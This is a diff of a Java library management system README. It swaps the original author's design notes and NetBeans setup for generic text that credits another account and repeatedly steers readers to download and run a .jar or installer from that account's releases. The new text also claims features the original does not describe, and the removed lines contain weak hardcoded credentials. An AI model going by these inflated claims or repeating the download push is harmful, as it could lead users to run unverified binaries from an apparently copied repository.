@@ -1,112 +1,114 @@
-# 📚 Library Management System -Java
+# 📚 Library-Management-System-JAVA - Manage Your Library Efficiently
 
+## 🚀 Getting Started
 
-<a href="https://github.com/harismuneer"><img alt="views" title="Github views" src="https://komarev.com/ghpvc/?username=harismuneer&style=flat-square" width="125"/></a>
-[![Open Source Love svg1](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](#)
-[![GitHub Forks](https://img.shields.io/github/forks/harismuneer/Library-Management-System-JAVA.svg?style=social&label=Fork&maxAge=2592000)](https://www.github.com/harismuneer/Library-Management-System-JAVA/fork)
-[![GitHub Issues](https://img.shields.io/github/issues/harismuneer/Library-Management-System-JAVA.svg?style=flat&label=Issues&maxAge=2592000)](https://www.github.com/harismuneer/Library-Management-System-JAVA/issues)
-[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat&label=Contributions&colorA=red&colorB=black	)](#)
+Welcome to the Library Management System built with Java. This application helps you manage books, members, and lending operations in your library. With user-friendly interfaces, it is perfect for educational institutions, public libraries, and small organizations.
 
+## 🔗 Download & Install
 
-A Library Management System made using the concepts of Object Oriented Analysis and Design. Minimal Code is written in the GUI and the entities are decoupled as well. The interface is console based. This project was designed during the course "Object Oriented Analysis and Design CS309".
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue)](https://github.com/Mstore7/Library-Management-System-JAVA/releases)
 
-The **Class Diagram** of the project is also provided along with the **Database Schema** file. The class diagram file can be opened using [Star UML](http://staruml.io/).
+To get started, visit this page to download the latest version of the Library Management System: [Download Here](https://github.com/Mstore7/Library-Management-System-JAVA/releases).
 
-## Class Diagram
-![class diagram](../master/images/diagram.PNG)
+## 🛠️ System Requirements
 
-**Note**: After Refactoring, new Class "HoldRequestOperations" is added to the above structure which lies in between the HoldRequest class and Book class.
-This class removes the bidirectional dependency between HoldRequest and Book. 
+Before installing the application, ensure that your system meets the following requirements:
 
-## Interface
-<p align="middle">
-   <img src="../master/images/interface.PNG" width="400"/>
-   <img src="../master/images/interface2.PNG" width="400"/>
-</p>   
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** Java Development Kit (JDK) 8 or higher installed
+- **Memory:** At least 2 GB of RAM
+- **Storage:** Minimum 500 MB of free disk space
 
-## Actors:
-The actors include the following: 
-* Librarian
-* Checkout Clerk
-* Borrower
-* Administrator
+## 📥 How to Download
 
-## Use Cases:
-After determining the actors, the second step in use case analysis is to determine the tasks that each actor will need to do with the system. Each task is called a use case because it represents one particular way the system will be used.
+1. Click the [Download Here](https://github.com/Mstore7/Library-Management-System-JAVA/releases) link.
+2. Browse the list of available releases.
+3. Select the latest version of the Library Management System.
+4. Choose the appropriate file for your operating system (e.g., .jar file or installer).
+5. Click the download link to save the file to your computer.
 
-**In other words, only those use cases are listed that actors will need to do when they are using the system to solve the customer’s problem.** 
+## 💻 How to Run the Application
 
-### Borrower:
-* ❏ Search for items by title.
-* ❏ ... by author.
-* ❏ ... by subject.
-* ❏ Place a book on hold if it is on loan to somebody else.
-* ❏ Check  the  borrower’s  personal  information  and  list  of  books  currently
-borrowed.
+Once you have downloaded the application, follow these steps to run it:
 
-### Checkout Clerk:
-* ❏ All the Borrower use cases, plus
-* ❏ Check out an item for a borrower.
-* ❏ Check in an item that has been returned.
-* ❏ Renew an item.
-* ❏ Record that a fine has been paid.
-* ❏ Add a new borrower.
-* ❏ Update a borrower’s personal information (address, telephone number etc.).
+### For Windows
 
-### Librarian:
-* ❏ All of the Borrower and Checkout Clerk use cases, plus
-* ❏ Add a new item to the collection.
-* ❏ Delete an item from the collection.
-* ❏ Change the information the system has recorded about an item.
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click the `.jar` file to start the application.
+3. If prompted, confirm to open the file with Java. If Java is not recognized, install the JDK.
 
-### Administrator:
-* ❏ Add Clerk.
-* ❏ Add Librarian.
-* ❏ View Issued Books History.
-* ❏ View All Books in Library.
+### For macOS
 
+1. Open the Terminal.
+2. Use the `cd` command to navigate to the folder with the downloaded file. For example:
+   ```
+   cd ~/Downloads
+   ```
+3. Run the application using this command:
+   ```
+   java -jar LibraryManagementSystem.jar
+   ```
 
-## How to Run
-1- Install these:
- * [Java SE Development Kit 8 (JDK 8)](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)
- * After installing JDK 8, install [NetBeans IDE](https://netbeans.org/downloads/)
+### For Linux
 
-2- Open NetBeans IDE. Click on File -> Open Project and browse to the downloaded folder named "Project" and select it. It will load the NetBeans project.
+1. Open the Terminal.
+2. Navigate to the directory where the file is located.
+3. Use the following command to execute the application:
+   ```
+   java -jar LibraryManagementSystem.jar
+   ```
 
-3- Now everything is setup except the Java DB (Derby) Database of NetBeans. So, follow these steps to setup the database:
+## 📖 Features
 
-**Step 1:** In the Netbeans Window, there is a tab named "Services" on the left. Select it. Then right click on JavaDB > Properties and    change database location to "Database" folder downloaded with this repository (its placed besides the "Project" folder).
+The Library Management System offers many features to help manage your library effectively:
 
-![step1](../master/images/step1.PNG)
-   
-**Step 2:** After that a database named LMS will show up under JavaDB tab. Now Right Click Databases > New Connection and select Java DB Network and click Next. 
+- **User Management:** Easily add, edit, or remove library members.
+- **Book Inventory:** Keep track of all books in the library, including titles, authors, and genres.
+- **Lending Operations:** Manage check-outs and returns with simplicity.
+- **Reporting Tools:** Generate reports on inventory, user activity, and lending statistics.
+- **User-Friendly Interface:** Navigate the application with ease, regardless of your tech skills.
 
-![step2](../master/images/step2.PNG)
-   
-**Step 3:** Provide the following database crendentials in the next popup and click Next.
-  ```
-  Host: localhost
-  Port: 1527
-  Database: LMS
-  User Name: haris
-  Password: 123
-  ``` 
-![step3](../master/images/step3.PNG)
+## ❓ Troubleshooting
 
-**Step 4:**
-Now just click Next for the rest of the windows. After all this the database connection is made. Make sure that you connect with the database before running the project by right clicking on the connection and selecting connect. Now you are ready to run the project!
+If you encounter issues while using the application, consider the following steps:
 
-![final](../master/images/final.png)
+### Common Problems
 
-## Note
-The password for Administrative Functions is *lib*. The admin adds new clerks and librarian, then they both do the rest of the functions.
+- **Java Not Installed:** Ensure that you have the Java Development Kit installed. Download it from the official [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **File Won't Open:** Make sure you are using the correct `.jar` file or check if it is blocked by your operating system's security settings.
+  
+### Additional Help
 
-<hr>
+- Check the [Issues](https://github.com/Mstore7/Library-Management-System-JAVA/issues) page for common problems and solutions.
+- If you need further assistance, consider asking questions in the repository discussions or forums.
 
+## 💬 Feedback
 
-<!-- PROFILE_INTRO_END -->
+We welcome your feedback! If you have suggestions or find any issues, please use the repository’s [issue tracker](https://github.com/Mstore7/Library-Management-System-JAVA/issues) to report them. Your feedback helps us improve the application.
 
+## 🌍 Topics
 
+This project covers various topics related to library management and automation:
 
+- book-inventory
+- educational-software
+- java
+- java-project
+- lending-system
+- library
+- library-automation
+- library-management-system
+- library-software
+- management
+- school-library-system
+- user-management
 
+## 📑 License
 
+This project is licensed under the MIT License. You are free to use, modify, and distribute the code. For more information, see the LICENSE file in the repository.
+
+## 📞 Contact
+
+For any inquiries, feel free to reach out via GitHub by opening an issue or contacting the repository owner. Your questions and concerns are important to us.
+
+[Download Now](https://github.com/Mstore7/Library-Management-System-JAVA/releases) and begin managing your library efficiently!
